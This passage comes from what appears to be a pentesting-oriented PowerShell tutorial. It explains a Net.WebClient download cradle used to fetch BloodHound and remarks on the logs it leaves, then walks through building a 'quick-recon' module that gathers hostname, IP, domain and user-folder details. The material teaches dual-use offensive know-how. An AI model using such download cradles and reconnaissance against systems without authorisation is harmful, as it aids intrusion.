-<span class="hljs-keyword">a</span><span class="hljs-comment">---          11/10/2022 10:44 AM      108511752 test.zip</span>
</code></pre>
<p>So it worked. Let&#39;s break down what we did:</p>
<ul>
<li>First we have the Download cradle <code>(New-Object Net.WebClient).DownloadFile()</code>, which is how we tell it to execute our request.</li>
<li>Next, we need to include the URI of the file we want to download as the first parameter in the (). For this example, that was <code>&quot;https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip&quot;</code>.</li>
<li>Finally, we need to tell the command where we want the file written to with the second parameter <code>, &quot;BloodHound.zip&quot;</code>.</li>
</ul>
<p>The command above would have downloaded the file to the current directory we are working from as <code>Bloodhound.zip</code>. Looking at our terminal, we can see that it executed successfully because the file <code>Bloodhound.zip</code> now exists in our <code>working directory</code>. If we wanted to place it somewhere else, we would have to specify the full path. From here, we can <code>extract</code> the tools and run them as we see fit. Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it <code>WILL</code> leave logs. If your transfers are done locally, only host to host, for example, you only leave logs on those hosts, which are a bit harder to sift through and leave less of a trace since we aren&#39;t writing ingress/egress logs at the customer boundary.</p>
<hr>
<h3 id="wrapping-up">Wrapping Up</h3>
<p>This section has only scratched the surface of what we could do with PowerShell when interacting with the web. Be sure to take some time and practice the different types of requests you can send and even the many different ways you can filter and use the information you get. From this point, we will move on and talk about automation with PowerShell and how it can benefit us.</p>
<h2 id="powershell-scripting-and-automation">PowerShell Scripting and Automation</h2>
<hr>
<p>As incredible as PowerShell is, it&#39;s only as good as how we use it. Much of the PowerShell language and functionality lends itself to being utilized in an automated fashion. Having the ability to build scripts and modules for us in PowerShell (no matter how simple or complex) can ease our administrative burden or clear some easy tasks off our plate as pentesters. This module will discuss the pieces and parts that make up a PowerShell script and module. By the end, we will have created our own easy-to-use and customizable module.</p>
<hr>
<h3 id="understanding-powershell-scripting">Understanding PowerShell Scripting</h3>
<p>PowerShell, by its nature, is modular and allows for a significant amount of control with its use. The traditional thought when dealing with scripting is that we are writing some form of an executable that performs tasks for us in the language it was created. With PowerShell, this is still true, with the exception that it can handle input from several different languages and file types and can handle many different object types. We can utilize singular scripts in the usual manner by calling them utilizing <code>.\script</code> syntax and importing modules using the <code>Import-Module</code> cmdlet. Now let&#39;s talk a bit about scripts and modules.</p>
<h4 id="scripts-vs-modules">Scripts vs. Modules</h4>
<p>The easiest way to think of it is that a script is an executable text file containing PowerShell cmdlets and functions, while a module can be just a simple script, or a collection of multiple script files, manifests, and functions bundled together. The other main difference is in their use. You would typically call a script by executing it directly, while you can import a module and all of the associated scripts and functions to call at your whim. For the sake of this section, we will discuss them using the same term, and everything we talk about in a module file works in a standard PowerShell script. First up is <code>file extensions</code> and what they mean to us.</p>
<h4 id="file-extensions">File Extensions</h4>
<p>To familiarize ourselves with some file extensions we will encounter while working with PowerShell scripts and modules, we have put together a small table with the extensions and their descriptions.</p>
<p><strong>PowerShell Extensions</strong></p>
<table>
<thead>
<tr>
<th><strong>Extension</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ps1</td>
<td>The <code>*.ps1</code> file extension represents executable PowerShell scripts.</td>
</tr>
<tr>
<td>psm1</td>
<td>The <code>*.psm1</code> file extension represents a PowerShell module file. It defines what the module is and what is contained within it.</td>
</tr>
<tr>
<td>psd1</td>
<td>The <code>*.psd1</code> is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.</td>
</tr>
</tbody>
</table>
<p>These are the main extensions we are concerned with right now. In reality, PowerShell modules can have many different accompanying files with various extensions, but they are not requirements for what we are trying to do. If you wish for a deeper dive into PowerShell script files, and help files, check out this <a href="https://learn.microsoft.com/en-us/powershell/scripting/developer/module/writing-a-windows-powershell-module?view=powershell-7.2">Post</a></p>
<hr>
<h3 id="making-a-module">Making a Module</h3>
<p>So let&#39;s get down to it. From this point on, we will cover the components of a PowerShell module, what they contain, and how to create them. This process is simple. It just takes a bit of prior planning. Consider this scenario:</p>
<p>Scenario: We have found ourselves performing the same checks over and over when administering hosts. So to expedite our tasks, we will create a PowerShell module to run the checks for us and then output the information we ask for. Our module, when used, should output the host&#39;s <code>computer name</code>, <code>IP address</code>, and basic <code>domain information</code>, and provide us with the output of the <code>C:\Users\</code> directory so we can see what users have interactively logged into that host.</p>
<p>Now that we know what&#39;s going into our module, it&#39;s time to start building it out.</p>
<hr>
<h3 id="module-components">Module Components</h3>
<p>A module is made up of <code>four</code> essential components:</p>
<ol>
<li><p>A <code>directory</code> containing all the required files and content, saved somewhere within <code>$env:PSModulePath</code>.</p>
</li>
<li><p>This is done so that when you attempt to import it into your PowerShell session or Profile, it can be automatically found instead of having to specify where it is.</p>
</li>
<li><p>A <code>manifest</code> file listing all files and pertinent information about the module and its function.</p>
</li>
<li><p>This could include associated scripts, dependencies, the author, example usage, etc.</p>
</li>
<li><p>Some code file - usually either a PowerShell script (<code>.ps1</code>) or a (<code>.psm1</code>) module file that contains our script functions and other information.</p>
</li>
<li>Other resources the module needs, such as help files, scripts, and other supporting documents.</li>
</ol>
<p>This setup is standard practice but not strictly necessary. We could have our module be just a <code>*.psm1</code> file that contains our scripts and context, skipping the manifest and other helper files. PowerShell would be able to interpret and understand what to do in either instance. For the sake of propriety, we will work on building out a standard PowerShell module, including the manifest file and some built-in help functionality.</p>
<h4 id="making-a-directory-to-hold-our-module">Making a Directory to Hold Our Module</h4>
<p>Making a directory is super simple, as discussed in earlier sections. Before we go any further, we need to create the directory to hold our module. This directory should be in one of the paths within <code>$env:PSModulePath</code>. If unsure as to what those paths are, you can call the variable to see where the best place would be. So we are going to make a folder named <code>quick-recon</code>.</p>
<p><strong>Mkdir</strong></p>
<p>PowerShell Scripting and Automation</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; mkdir quick-recon  

    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>odules


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/31/2022   7:38 AM                quick-recon
</code></pre>
<p>Now that we have our directory, we can create the module. Let&#39;s discuss a <code>module manifest</code> file for a second.</p>
<h4 id="module-manifest">Module Manifest</h4>
<p>A module manifest is a simple <code>.psd1</code> file that contains a hash table. The keys and values in the hash table perform the following functions:</p>
<ul>
<li>Describe the <code>contents</code> and <code>attributes</code> of the module.</li>
<li>Define the <code>prerequisites</code>. ( specific modules from outside the module itself, variables, functions, etc.)</li>
<li>Determine how the <code>components</code> are <code>processed</code>.</li>
</ul>
<p>If you add a manifest file to the module folder, you can reference multiple files as a single unit by referencing the manifest. The <code>manifest</code> describes the following information:</p>
<ul>
<li><code>Metadata</code> about the module, such as the module version number, the author, and the description.</li>
<li><code>Prerequisites</code> needed to import the module, such as the Windows PowerShell version, the common language runtime (CLR) version, and the required modules.</li>
<li><code>Processing</code> directives, such as the scripts, formats, and types to process.</li>
<li><code>Restrictions</code> on the module members to export, such as the aliases, functions, variables, and cmdlets to export.</li>
</ul>
<p>We can quickly create a manifest file by utilizing <code>New-ModuleManifest</code> and specifying where we want it placed.</p>
<p><strong>New-ModuleManifest</strong></p>
<p>PowerShell Scripting and Automation</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru

<span class="hljs-meta"># Module manifest for module 'quick-recon'</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Generated by: MTanaka</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Generated on: 10/31/2022</span>
<span class="hljs-meta">#</span>

@{

<span class="hljs-meta"># Script module or binary module file associated with this manifest.</span>
<span class="hljs-meta"># RootModule = ''</span>

<span class="hljs-meta"># Version number of this module.</span>
ModuleVersion = <span class="hljs-string">'1.0'</span>

&lt;SNIP&gt;
</code></pre>
<p>By issuing the command above, we have provisioned a <code>new</code> manifest file populated with the default considerations. The <code>-PassThru</code> modifier lets us see what is being printed in the file and on the console. We can now go in and fill in the sections we want with the relevant info. Remember that all the lines in the manifest files are optional except for the <code>ModuleVersion</code> line. Editing the manifest will be easiest done from a GUI where you can utilize a text editor or IDE such as VSCode. If we were to complete our manifest file now for this module, it would appear something like this:</p>
<p><strong>Sample Manifest</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"># Module manifest <span class="hljs-keyword">for</span> <span class="hljs-keyword">module</span> 'quick-recon'
#
# Generated by: MTanaka
#
# Generated on: <span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span>
#

@{

# Script <span class="hljs-keyword">module</span> <span class="hljs-keyword">or</span> binary <span class="hljs-keyword">module</span> file associated <span class="hljs-keyword">with</span> <span class="hljs-keyword">this</span> manifest.
# RootModule = 'C:\Users\MTanaka\WindowsPowerShell\Modules\quick-recon\quick-recon<span class="hljs-variable">.psm1</span>'

# Version number of <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>.
ModuleVersion = '<span class="hljs-number">1</span><span class="hljs-variable">.0</span>'

# ID used to uniquely identify <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
GUID = '<span class="hljs-number">0</span>a062bb1-<span class="hljs-number">8</span>a1b-<span class="hljs-number">4</span>bdb-<span class="hljs-number">86</span>ed-<span class="hljs-number">5</span>adbe1071d2f'

# Author of <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
Author = 'MTanaka'

# Company <span class="hljs-keyword">or</span> vendor of <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
CompanyName = 'Greenhorn<span class="hljs-variable">.Corp</span>.'

# Copyright statement <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
Copyright = '(c) <span class="hljs-number">2022</span> Greenhorn<span class="hljs-variable">.Corp</span>. All rights reserved.'

# Description of the functionality provided by <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
Description = 'This <span class="hljs-keyword">module</span> will perform several quick checks against the host <span class="hljs-keyword">for</span> Reconnaissance of key information.'

# Functions to <span class="hljs-keyword">export</span> from <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>, <span class="hljs-keyword">for</span> best performance, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> wildcards <span class="hljs-keyword">and</span> <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> delete the entry, <span class="hljs-keyword">use</span> an empty array <span class="hljs-keyword">if</span> there are no functions to <span class="hljs-keyword">export</span>.
FunctionsToExport = @()

# Cmdlets to <span class="hljs-keyword">export</span> from <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>, <span class="hljs-keyword">for</span> best performance, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> wildcards <span class="hljs-keyword">and</span> <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> delete the entry, <span class="hljs-keyword">use</span> an empty array <span class="hljs-keyword">if</span> there are no cmdlets to <span class="hljs-keyword">export</span>.
CmdletsToExport = @()

# Variables to <span class="hljs-keyword">export</span> from <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
VariablesToExport = '*'

# Aliases to <span class="hljs-keyword">export</span> from <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>, <span class="hljs-keyword">for</span> best performance, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> wildcards <span class="hljs-keyword">and</span> <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> delete the entry, <span class="hljs-keyword">use</span> an empty array <span class="hljs-keyword">if</span> there are no aliases to <span class="hljs-keyword">export</span>.
AliasesToExport = @()

# List of all modules packaged <span class="hljs-keyword">with</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
# ModuleList = @()

# List of all files packaged <span class="hljs-keyword">with</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">module</span>
# FileList = @()  
}
</code></pre>
<p>We can come back to the manifest later and add in the <code>functions, cmdlets, and variables</code> we want to allow for export. We need to build and finish the script first.</p>
<h4 id="create-our-script-file">Create Our Script File</h4>
<p>We can use the <code>New-Item</code> (ni) cmdlet to create our file.</p>
<p><strong>New-Item</strong></p>
<p>PowerShell Scripting and Automation</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt;  ni quick-recon.psm1 -ItemType File


    Directory: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>odules<span class="hljs-symbol">\q</span>uick-recon


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/31/2022   9:07 AM              0 quick-recon.psm1
</code></pre>
<p>Easy enough, right? Now to fill in this beast.</p>
<h4 id="importing-modules-you-need">Importing Modules You Need</h4>
<p>If our new PowerShell requires other modules or cmdlets from within them to operate correctly, we will place an <code>Import-Module</code> string at the beginning of our script file. The use of Import-Module in this manner functions much like it would if we issued it from within the shell; it calls and loads the modules we need before executing our script. To accomplish the goals we have for this module, many of the cmdlets and functions are already built-in into PowerShell. We do need one from the ActiveDirectory PowerShell module, however. So let&#39;s add an import line for the <code>ActiveDirectory</code> module.</p>
<p><strong>Import Into Our Module</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ActiveDirectory
</code></pre>
<p>Pretty simple right? Now we have our module script file <code>quick-recon.psm1</code>, and we have added an <code>import-module</code> statement within. Now we can get to the meat of the file, our <code>functions</code>.</p>
<h4 id="functions-and-doing-work-with-powershell">Functions and doing work with Powershell</h4>
<p>We need to do four main things with this module:</p>
<ul>
<li>Retrieve the host ComputerName</li>
<li>Retrieve the hosts IP configuration</li>
<li>Retrieve basic domain information</li>
<li>Retrieve an output of the &quot;C:\Users&quot; directory</li>
</ul>
<p>To get started, let&#39;s focus on the ComputerName output. We can get this many ways with various cmdlets, modules, and DOS commands. Our script will utilize the environment variable (<code>$env:ComputerName</code>) to acquire the hostname for the output. To make our output easier to read later, we will use another variable named <code>$hostname</code> to store the output from the environment variable. To capture the IP address for the active host adapters, we will use <code>IPConfig</code> and store that info in the variable <code>$IP</code>. For Basic domain information, we will use <code>Get-ADDomain</code> and store the output into <code>$Domain</code>. Lastly, we will grab a listing of the user folders in C:\Users\ with <code>Get-ChildItem</code> and store it in <code>$Users</code>. To create our variables, we must first specify a name like (<code>$Hostname</code>), append the &quot;=&quot; symbol, and then follow it with the action or values we want it to hold. For example, the first variable we need, <code>$Hostname</code>, would appear like so: (<code>$Hostname = $env:ComputerName</code>). Now let&#39;s dive in and create the rest of our variables for use.</p>
<p><strong>Variables</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">Import-Module ActiveDirectory 

<span class="hljs-meta"><span class="hljs-meta-keyword">$Hostname</span> = $env:ComputerName</span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$IP</span> = ipconfig </span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$Domain</span> = Get-ADDomain  </span>
<span class="hljs-meta"><span class="hljs-meta-keyword">$Users</span> = Get-ChildItem C:\Users\</span>
</code></pre>
<p>Our variables are now set to run singular commands or functions, grabbing the needed output. Now let&#39;s format that data and give ourselves some nice output. We can do this by writing the result to a <code>file</code> using <code>New-Item</code> and <code>Add-Content</code>. To make things easier, we will make this output process into a callable function called <code>Get-Recon</code>.</p>
<p><strong>Output Our Info</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-built_in">Import-Module</span> ActiveDirectory

<span class="hljs-keyword">function</span> Get-Recon {  

    <span class="hljs-variable">$Hostname</span> = <span class="hljs-variable">$env:ComputerName</span>  

    <span class="hljs-variable">$IP</span> = ipconfig

    <span class="hljs-variable">$Domain</span> = Get-ADDomain 

    <span class="hljs-variable">$Users</span> = <span class="hljs-built_in">Get-ChildItem</span> C:\Users\

    <span class="hljs-built_in">new-Item</span> ~\Desktop\recon.txt -ItemType File 

    <span class="hljs-variable">$Vars</span> = <span class="hljs-string">"***---Hostname info---***"</span>, <span class="hljs-variable">$Hostname</span>, <span class="hljs-string">"***---Domain Info---***"</span>, <span class="hljs-variable">$Domain</span>, <span class="hljs-string">"***---IP INFO---***"</span>,  <span class="hljs-variable">$IP</span>, <span class="hljs-string">"***---USERS---***"</span>, <span class="hljs-variable">$Users</span>

    <span class="hljs-built_in">Add-Content</span> ~\Desktop\recon.txt <span class="hljs-variable">$Vars</span>
  }
</code></pre>
<p><code>New-Item</code> creates our output file for us first, then notice how we utilized one more variable (<code>$Vars</code>) to format our output. We call each variable and insert a descriptive line in between each. Lastly, the <code>Add-Content</code> cmdlet appends the data we gather into a file called recon.txt by writing the results of $Vars. Our function is shaping up now. Next, we need to add some comments to our file so that others can understand what we are trying to accomplish and why we did it the way we did.</p>
<h4 id="comments-within-the-script">Comments within the Script</h4>
<p>The (<code>#</code>) will tell PowerShell that the line contains a comment within your script or module file. If your comments are going to encompass several lines, you can use the <code>&lt;#</code> and <code>#&gt;</code> to wrap several lines as one large comment like seen below:</p>
<p><strong>Comment Blocks</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">
<span class="hljs-comment"># This is a single-line comment.  </span>

&lt;<span class="hljs-comment"># This line and the following lines are all wrapped in the Comment specifier. </span>
Nothing <span class="hljs-keyword">with</span> this window will be ready <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> script <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> <span class="hljs-function"><span class="hljs-keyword">function</span>.</span>
This <span class="hljs-keyword">text</span> exists purely <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> creator <span class="hljs-keyword">and</span> us <span class="hljs-built_in">to</span> convey pertinent information.

<span class="hljs-comment">#&gt;</span>
</code></pre>
<p><strong>Comments Added</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">Import-Module ActiveDirectory

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> </span>{  
    <span class="hljs-comment"># Collect the hostname of our PC.</span>
    $Hostname = $env:ComputerName  
    <span class="hljs-comment"># Collect the IP configuration.</span>
    $IP = ipconfig
    <span class="hljs-comment"># Collect basic domain information.</span>
    $Domain = Get-ADDomain 
    <span class="hljs-comment"># Output the users who have logged in and built out a basic directory structure in "C:\Users\".</span>
    $Users = Get-ChildItem C:\Users\
    <span class="hljs-comment"># Create a new file to place our recon results in.</span>
    <span class="hljs-keyword">new</span>-Item ~\Desktop\recon.txt -ItemType File 
    <span class="hljs-comment"># A variable to hold the results of our other variables. </span>
    $Vars = <span class="hljs-string">"***---Hostname info---***"</span>, $Hostname, <span class="hljs-string">"***---Domain Info---***"</span>, $Domain, <span class="hljs-string">"***---IP INFO---***"</span>,  $IP, <span class="hljs-string">"***---USERS---***"</span>, $Users
    <span class="hljs-comment"># It does the thing </span>
    Add-Content ~\Desktop\recon.txt $Vars
  }
</code></pre>
<p>It&#39;s as simple as that. Nothing too crazy with comments. Now we need to include a bit of <code>help</code> syntax so others can understand how to use our module.</p>
<h4 id="including-help">Including Help</h4>
<p>PowerShell utilizes a form of <code>Comment-based help</code> to embed whatever you need for the script or module. We can utilize <code>comment blocks</code> like those we discussed above, along with recognized <code>keywords</code> to build the help section out and even call it using <code>Get-Help</code> afterward. When it comes to placement, we have <code>two</code> options here. We can place the help within the function itself or outside of the function in the script. If we wish to place it within the function, it must be at the beginning of the function, right after the opening line for the function, or at the end of the function, one line after the last action of the function. If we place it within the script but outside of the function itself, we must place it above our function with no more than one line between the help and function. For a deeper dive into help within PowerShell, check out this <a href="https://learn.microsoft.com/en-us/powershell/scripting/developer/help/writing-help-for-windows-powershell-scripts-and-functions?view=powershell-7.2">article</a>. Now let&#39;s define our help section. We will place it outside of the function at the top of the script for now.</p>
<p><strong>Module Help</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">Import-Module ActiveDirectory

&lt;<span class="hljs-comment"># </span>
.Description  
This function performs <span class="hljs-keyword">some</span> simple recon tasks <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> user. We import <span class="hljs-keyword">the</span> module <span class="hljs-keyword">and</span> issue <span class="hljs-keyword">the</span> 'Get-Recon' command <span class="hljs-keyword">to</span> retrieve our output. Each variable <span class="hljs-keyword">and</span> line within <span class="hljs-keyword">the</span> function <span class="hljs-keyword">and</span> <span class="hljs-keyword">script</span> are commented <span class="hljs-keyword">for</span> our understanding. Right now, this module will only work <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">local</span> host <span class="hljs-keyword">from</span> which you <span class="hljs-built_in">run</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> output will be sent <span class="hljs-keyword">to</span> a <span class="hljs-built_in">file</span> named 'recon.txt' <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> Desktop <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> user who opened <span class="hljs-keyword">the</span> shell. Remote Recon functions are coming soon!  

.Example  
After importing <span class="hljs-keyword">the</span> module <span class="hljs-built_in">run</span> <span class="hljs-string">"Get-Recon"</span>
'Get-Recon


    Directory: C:\Users\MTanaka\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                        
<span class="hljs-comment">----                 -------------         ------ ----                                                                                                                                        </span>
-a<span class="hljs-comment">----         11/3/2022  12:46 PM              0 recon.txt '</span>

.Notes  
Remote Recon functions coming soon! This <span class="hljs-keyword">script</span> serves <span class="hljs-keyword">as</span> our initial introduction <span class="hljs-keyword">to</span> writing functions <span class="hljs-keyword">and</span> scripts <span class="hljs-keyword">and</span> making PowerShell modules.  

<span class="hljs-comment">#&gt;</span>

function Get-Recon {  
&lt;SNIP&gt;
</code></pre>
<p>Notice our use of <code>keywords</code>. To specify a keyword within the comment block, we use the syntax <code>.&lt;keyword&gt;</code> and then place the flavor text underneath. We only specified <code>Description, Example, and Notes</code>, but several more keywords can be placed in the help block. To see all the available keywords, reference this article on <a href="https://learn.microsoft.com/en-us/powershell/scripting/developer/help/comment-based-help-keywords?view=powershell-7.2">Comment Based Help Keywords</a>. Our last portion to discuss before wrapping everything up into our nice PowerShell Module file, is Exporting and Protecting functions.</p>
<h4 id="protecting-functions">Protecting Functions</h4>
<p>We may add functions to our scripts that we do not want to be accessed, exported, or utilized by other scripts or processes within PowerShell. To protect a function from being exported or to explicitly set it for export, the <code>Export-ModuleMember</code> is the cmdlet for the job. The contents are exportable if we leave this out of our script modules. If we place it in the file but leave it blank like so:</p>
<p><strong>Exclude From Export</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-keyword">Export</span>-ModuleMember
</code></pre>
<p>It ensures that the module&#39;s variables, aliases, and functions cannot be <code>exported</code>. If we wish to specify what to export, we can add them to the command string like so:</p>
<p><strong>Export Specific Functions and Variables</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-keyword">Export</span>-ModuleMember -<span class="hljs-keyword">Function</span> Get-Recon -<span class="hljs-keyword">Variable</span> Hostname
</code></pre>
<p>Alternatively, if you only wanted to export all functions and a specific variable, for example, you could issue the <code>*</code> after -Function and then specify the Variables to export explicitly. So let&#39;s add the <code>Export-ModuleMember</code> cmdlet to our script and specify that we want to allow our function <code>Get-Recon</code> and our variable <code>Hostname</code> to be available for export.</p>
<p><strong>Export Line Addition</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">&lt;SNIP&gt;  
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> </span>{  
    <span class="hljs-comment"># Collect the hostname of our PC</span>
    $Hostname = $env:ComputerName  
    <span class="hljs-comment"># Collect the IP configuration</span>
    $IP = ipconfig
    <span class="hljs-comment"># Collect basic domain information</span>
    $Domain = Get-ADDomain 
    <span class="hljs-comment"># Output the users who have logged in and built out a basic directory structure in "C:\Users"</span>
    $Users = Get-ChildItem C:\Users\
    <span class="hljs-comment"># Create a new file to place our recon results in</span>
    <span class="hljs-keyword">new</span>-Item ~\Desktop\recon.txt -ItemType File 
    <span class="hljs-comment"># A variable to hold the results of our other variables </span>
    $Vars = <span class="hljs-string">"***---Hostname info---***"</span>, $Hostname, <span class="hljs-string">"***---Domain Info---***"</span>, $Domain, <span class="hljs-string">"***---IP INFO---***"</span>,  $IP, <span class="hljs-string">"***---USERS---***"</span>, $Users
    <span class="hljs-comment"># It does the thing </span>
    Add-Content ~\Desktop\recon.txt $Vars
  } 

Export-ModuleMember -<span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> -<span class="hljs-title">Variable</span> <span class="hljs-title">Hostname</span></span>
</code></pre>
<h4 id="scope">Scope</h4>
<p>When dealing with scripts, the PowerShell session, and how stuff is recognized at the Commandline, the concept of Scope comes into play. Scope, in essence, is how PowerShell recognizes and protects objects within the session from unauthorized access or modification. PowerShell currently uses <code>three</code> different Scope levels:</p>
<p><strong>Scope Levels</strong></p>
<table>
<thead>
<tr>
<th><strong>Scope</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Global</td>
<td>This is the default scope level for PowerShell. It affects all objects that exist when PowerShell starts, or a new session is opened. Any variables, aliases, functions, and anything you specify in your PowerShell profile will be created in the Global scope.</td>
</tr>
<tr>
<td>Local</td>
<td>This is the current scope you are operating in. This could be any of the default scopes or child scopes that are made.</td>
</tr>
<tr>
<td>Script</td>
<td>This is a temporary scope that applies to any scripts being run. It only applies to the script and its contents. Other scripts and anything outside of it will not know it exists. To the script, Its scope is the local scope.</td>
</tr>
</tbody>
</table>
<p>This matters to us if we do not want anything outside the scope we are running the script in to access its contents. Additionally, we can have child scopes created within the main scopes. For example, when you run a script, the script scope is instantiated, and then any function that is called can also spawn a child scope surrounding that function and its included variables. If we wanted to ensure that the contents of that specific function were not accessible to the rest of the script or the PowerShell session itself, we could modify its scope. This is a complex topic and something above the level of this module currently, but we felt it was worth mentioning. For more on Scope in PowerShell, check out the documentation <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_scopes?view=powershell-7.2">here</a>.</p>
<h4 id="putting-it-all-together">Putting It All Together</h4>
<p>Now that we have gone through and created our pieces and parts let&#39;s see it all together.</p>
<p><strong>Final Product</strong></p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"><span class="hljs-keyword">import</span>-<span class="hljs-built_in">module</span> ActiveDirectory

&lt;<span class="hljs-comment"># </span>
.Description  
This <span class="hljs-keyword">function</span> performs some simple recon tasks <span class="hljs-keyword">for</span> the user. We <span class="hljs-keyword">import</span> the <span class="hljs-built_in">module</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> issue the <span class="hljs-string">'Get-Recon'</span> command <span class="hljs-keyword">to</span> retrieve our output. Each variable <span class="hljs-keyword">and</span> line within the <span class="hljs-keyword">function</span> <span class="hljs-keyword">and</span> script are commented <span class="hljs-keyword">for</span> your understanding. Right now, <span class="hljs-keyword">this</span> only works <span class="hljs-literal">on</span> the local host <span class="hljs-keyword">from</span> which you run <span class="hljs-literal">it</span>, <span class="hljs-keyword">and</span> the output will be sent <span class="hljs-keyword">to</span> a file named <span class="hljs-string">'recon.txt'</span> <span class="hljs-literal">on</span> the Desktop <span class="hljs-keyword">of</span> the user who opened the shell. Remote Recon functions coming soon!  

.Example  
After importing the <span class="hljs-built_in">module</span> run <span class="hljs-string">"Get-Recon"</span>
<span class="hljs-string">'Get-Recon


    Directory: C:\Users\MTanaka\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                        
----                 -------------         ------ ----                                                                                                                                        
-a----         11/3/2022  12:46 PM              0 recon.txt '</span>

.Notes  
Remote Recon functions coming soon! This script serves as our initial introduction <span class="hljs-keyword">to</span> writing functions <span class="hljs-keyword">and</span> scripts <span class="hljs-keyword">and</span> making PowerShell modules.  

<span class="hljs-comment">#&gt;</span>
<span class="hljs-keyword">function</span> Get-Recon {  
    <span class="hljs-comment"># Collect the hostname of our PC</span>
    $Hostname = $env:ComputerName  
    <span class="hljs-comment"># Collect the IP configuration</span>
    $IP = ipconfig
    <span class="hljs-comment"># Collect basic domain information</span>
    $Domain = Get-ADDomain 
    <span class="hljs-comment"># Output the users who have logged in and built out a basic directory structure in "C:\Users"</span>
    $Users = Get-ChildItem C:<span class="hljs-string">\Users\</span>
    <span class="hljs-comment"># Create a new file to place our recon results in</span>
    <span class="hljs-keyword">new</span>-Item ~<span class="hljs-string">\Desktop\recon.txt</span> -ItemType File 
    <span class="hljs-comment"># A variable to hold the results of our other variables </span>
    $Vars = <span class="hljs-string">"***---Hostname info---***"</span>, $Hostname, <span class="hljs-string">"***---Domain Info---***"</span>, $Domain, <span class="hljs-string">"***---IP INFO---***"</span>,  $IP, <span class="hljs-string">"***---USERS---***"</span>, $Users
    <span class="hljs-comment"># It does the thing </span>
    Add-Content ~<span class="hljs-string">\Desktop\recon.txt</span> $Vars
  } 

Export-ModuleMember -Function Get-Recon -Variable Hostname
</code></pre>
<p>And there we have it, our full module file. Our use of Comment-based help, functions, variables and content protection makes for a dynamic and clear-to-read script. From here we can save this file in our Module directory we created and import it from within PowerShell for use.</p>
<p><strong>Importing the Module For Use</strong></p>
<p>PowerShell Scripting and Automation</p>
